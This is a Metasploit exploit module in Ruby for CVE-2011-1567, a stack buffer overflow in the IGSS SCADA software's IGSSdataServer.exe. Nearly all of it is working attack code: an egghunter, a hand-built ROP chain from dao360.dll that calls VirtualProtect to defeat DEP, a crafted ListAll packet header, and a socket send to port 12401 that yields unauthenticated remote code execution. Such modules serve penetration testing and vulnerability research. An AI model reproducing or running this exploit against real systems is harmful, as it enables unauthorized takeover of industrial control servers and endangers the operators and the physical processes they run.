##
# $Id: igss9_igssdataserver_listall.rb 12639 2011-05-16 19:30:17Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Egghunter
	include Msf::Exploit::Remote::Tcp

	def initialize(info={})
		super(update_info(info,
			'Name'           => "7-Technologies IGSS <= v9.00.00 b11063 IGSSdataServer.exe Stack Overflow",
			'Description'    => %q{
					This module exploits a vulnerability in the igssdataserver.exe component of 7-Technologies
				IGSS up to version 9.00.00 b11063. While processing a ListAll command, the application
				fails to do proper bounds checking before copying data into a small buffer on the stack.
				This causes a buffer overflow and allows to overwrite a structured exception handling record
				on the stack, allowing for unauthenticated remote code execution.
			},
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 12639 $',
			'Author'         =>
				[
					'Luigi Auriemma', #Initial discovery, poc
					'Lincoln',        #Metasploit
					'corelanc0d3r',   #Rop exploit, combined XP SP3 & 2003 Server
					'sinn3r',         #Serious Msf style policing
				],
			'References'     =>
				[
					['CVE', '2011-1567'],
					['OSVDB', ''],
					['URL', 'http://aluigi.altervista.org/adv/igss_2-adv.txt'],
				],
			'Payload'        =>
				{
					'BadChars' => "\x00",
				},
			'DefaultOptions'  =>
				{
					'ExitFunction' => 'process',
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						'Windows XP SP3/2003 Server R2 SP2 (DEP Bypass)',
						{
							'Ret'    => 0x1b77ca8c,  #dao360.dll pivot 1388 bytes
							'Offset' => 500
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => "March 24 2011",
			'DefaultTarget'  => 0))

			register_options(
			[
				Opt::RPORT(12401)
			], self.class)
	end

	def junk
		return rand_text(4).unpack("L")[0].to_i
	end

	def exploit

		eggoptions =
		{
			:checksum => false,
			:eggtag => 'w00t',
			:depmethod => 'virtualprotect',
			:depreg => 'esi'
		}

		badchars = "\x00"
		hunter,egg = generate_egghunter(payload.encoded, badchars, eggoptions)

		#dao360.dll - pvefindaddr rop 'n roll
		rop_chain = [
			0x1b7681c4,  # rop nop
			0x1b7681c4,  # rop nop
			0x1b7681c4,  # rop nop
			0x1b7681c4,  # rop nop
			0x1b7681c4,  # rop nop
			0x1b7681c4,  # rop nop
			0x1b7681c4,  # rop nop
			0x1b7681c4,  # rop nop
			0x1b7681c4,  # rop nop
			0x1b7681c4,  # rop nop
			0x1b72f174,  # POP EAX # RETN 08
			0xA1A10101,
			0x1b7762a8,  # ADD EAX,5E5F0000 # RETN 08 
			junk,
			junk,
			0x1b73a55c,  # XCHG EAX,EBX # RETN
			junk,
			junk,
			0x1b724004,  # pop ebp
			0x1b72f15f,  # &push esp # retn 8
			0x1b72f040,  # POP ECX # RETN
			0x1B78F010,  # writeable
			0x1b7681c2,  # xor eax,eax # retn
			0x1b72495c,  # add al,40 # mov [esi+4],eax # pop esi # retn 4
			0x41414141,  
			0x1b76a883,  # XCHG EAX,ESI # RETN 00  
			junk,
			0x1b7785c1,  # XOR EDX,EDX # CMP EAX,54 # SETE DL # MOV EAX,EDX # ADD ESP,8 # RETN 0C 
			junk,
			junk,
			0x1b78535c,  # ADD EDX,ESI # SUB EAX,EDX # MOV DWORD PTR DS:[ECX+F8],EAX # XOR EAX,EAX # POP ESI # RETN 10
			junk,
			junk,
			junk,
			junk,
			0x1b7280b4,  # POP EDI # XOR EAX,EAX # POP ESI # RETN
			junk,
			junk,
			junk,
			junk,
			0x1b7681c4,  # rop nop (edi)
			0x90909090,  # esi -> eax -> nop
			0x1b72f174,  # POP EAX # RETN 08
			0xA1F50214,  # offset to &VirtualProtect
			0x1b7762a8,  # ADD EAX,5E5F0000 # RETN 08
			junk,
			junk,
			0x1b73f3bd,  # MOV EAX,DWORD PTR DS:[EAX] # RETN
			junk,
			junk,
			0x1b76a883,  # XCHG EAX,ESI # RETN 00
			0x1b72f040,  # pop ecx
			0x1B78F010,  # writeable (ecx)
			0x1b764716,  # PUSHAD # RETN
		].pack('V*')

		header = "\x00\x04\x01\x00\x34\x12\x0D\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"
		header << rand_text(14)
		sploit = rop_chain
		sploit << "\x90" * 10
		sploit << hunter
		sploit << rand_text(target['Offset'] - (sploit.length))
		sploit << [target.ret].pack('V') 
		sploit << egg
		sploit << rand_text(2000)

		connect
		print_status("Sending request...")
		sock.put(header + sploit)
		handler
		disconnect

	end

end